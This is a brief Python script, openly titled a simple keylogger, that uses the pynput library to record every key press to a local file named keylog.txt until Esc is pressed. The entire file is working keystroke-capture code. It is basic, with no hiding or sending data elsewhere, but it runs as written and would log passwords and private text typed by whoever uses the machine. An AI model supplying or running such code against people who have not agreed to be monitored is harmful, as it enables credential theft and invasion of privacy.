# A simple Keylogger script by Muhammad Ali Raja

from pynput.keyboard import Key, Listener  # Manages and controls user input devices

# Path to the log file
log_file = "keylog.txt"

# Function to write the pressed key to the log file
def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(str(key))

# Function to handle key press events
def on_press(key):
    if key == Key.esc:  # Stop the keylogger when the 'esc' key is pressed
        return False
    write_to_log(key)

# Function to handle key release events
def on_release(key):
    pass

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
